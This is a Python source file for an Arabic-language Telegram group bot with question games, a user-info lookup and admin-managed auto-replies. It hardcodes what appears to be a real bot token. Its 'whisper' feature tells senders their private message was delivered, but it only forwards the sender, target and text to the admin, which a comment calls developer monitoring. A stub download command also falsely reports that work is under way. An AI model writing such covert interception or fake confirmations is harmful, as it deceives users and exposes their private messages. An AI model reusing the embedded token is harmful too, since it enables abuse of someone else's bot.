import telebot
import random

# --- الإعدادات (تم وضع بياناتك) ---
TOKEN = "8303634172:AAFAu8zC7RWFPRSOOXM_lYAflVKt489stKw"
ADMIN_ID = 8217288002  # أيديك الخاص
bot = telebot.TeleBot(TOKEN)

# مخازن البيانات للردود والتاكات
responses = {}
tags = {}

# --- 1. قائمة الأسئلة (أكثر من 100 سؤال) ---
questions = [
    "هل أنت شخص صبور؟", "ما هو هدفك في الحياة؟", "أكثر بلد تحب زيارته؟", 
    "من هو الشخص الذي تثق به؟", "ما هو حلمك الذي لم يتحقق؟", "أجمل ذكرى في طفولتك؟"
] + [f"سؤال رقم {i}: هل تفضل النجاح أم السعادة؟" for i in range(7, 105)]

# --- 2. خيارات لو خيروك ---
choices = [
    "تاكل فلفل حار جداً 🌶️ أو ليمون حامض 🍋؟",
    "تعيش في غابة مع الحيوانات 🦁 أو في جزيرة مهجورة 🏝️؟",
    "تخسر هاتفك لمدة أسبوع 📱 أو تعيش بدون إنترنت شهر 🌐؟",
    "تكون بطل خارق 🦸‍♂️ أو تكون ملياردير 💰؟"
]

# --- 3. أوامر الإدارة (للمطور فقط) ---
@bot.message_handler(func=lambda m: m.text == "بوت" and m.from_user.id == ADMIN_ID)
def admin_menu(message):
    txt = "🛠️ **أوامر التحكم (للمطور):**\n\n"
    txt += "➕ `اضف رد كلمة = جواب`\n"
    txt += "➖ `حذف رد كلمة`\n"
    txt += "➕ `اضف تاك اسم = نص`\n"
    txt += "➖ `حذف تاك اسم`"
    bot.reply_to(message, txt, parse_mode="Markdown")

# --- 4. أمر الكشف المعدل (حرف ا) ---
@bot.message_handler(func=lambda m: m.text == "ا")
def advanced_kashf(message):
    user = message.from_user
    status = random.choice(["متفاعل نار 🔥", "متفاعل متوسط ✨", "صنم 🗿", "أسطورة الجروب 👑"])
    info = f"👤 **اسـمك:** {user.first_name}\n"
    info += f"🆔 **أيديـك:** `{user.id}`\n"
    info += f"🔗 **يوزرك:** @{user.username if user.username else 'لا يوجد'}\n"
    info += f"📈 **تفاعلك:** {status}"
    
    photos = bot.get_user_profile_photos(user.id)
    if photos.total_count > 0:
        bot.send_photo(message.chat.id, photos.photos[0][-1].file_id, caption=info, parse_mode="Markdown")
    else:
        bot.reply_to(message, info, parse_mode="Markdown")

# --- 5. أمر الهمسة (يراقبها المطور) ---
@bot.message_handler(func=lambda m: m.text.startswith("همسه"))
def whisper(message):
    try:
        parts = message.text.split(maxsplit=2)
        target, msg = parts[1], parts[2]
        bot.reply_to(message, f"✅ تم إرسال الهمسة إلى {target}")
        bot.send_message(ADMIN_ID, f"🤫 **همسة من @{message.from_user.username}:**\nإلى: {target}\nالنص: {msg}")
    except:
        bot.reply_to(message, "⚠️ استخدم: همسه @يوزر الرسالة")

# --- 6. الأوامر العامة ---
@bot.message_handler(func=lambda m: m.text == "اسألني")
def ask(message): bot.reply_to(message, random.choice(questions))

@bot.message_handler(func=lambda m: m.text == "لو خيروك")
def choose(message): bot.reply_to(message, random.choice(choices))

@bot.message_handler(func=lambda m: m.text.startswith("يوت"))
def yt(message): bot.reply_to(message, "🎶 أرسل الرابط.. جاري تجهيز التحميل الصوتي")

# --- 7. معالج الردود والتاكات ---
@bot.message_handler(func=lambda m: True)
def process(message):
    user_id, text = message.from_user.id, message.text
    if text.startswith("اضف رد") and user_id == ADMIN_ID:
        try:
            p = text.split("اضف رد ")[1].split("=")
            responses[p[0].strip()] = p[1].strip()
            bot.reply_to(message, "✅ تم إضافة الرد")
        except: pass
    elif text.startswith("حذف رد") and user_id == ADMIN_ID:
        try:
            word = text.split("حذف رد ")[1].strip()
            responses.pop(word, None)
            bot.reply_to(message, "🗑️ تم الحذف")
        except: pass
    elif text in responses:
        bot.reply_to(message, responses[text])
    elif text in tags:
        bot.send_message(message.chat.id, f"{tags[text]} @all")

if __name__ == "__main__":
    bot.remove_webhook()
    bot.infinity_polling()
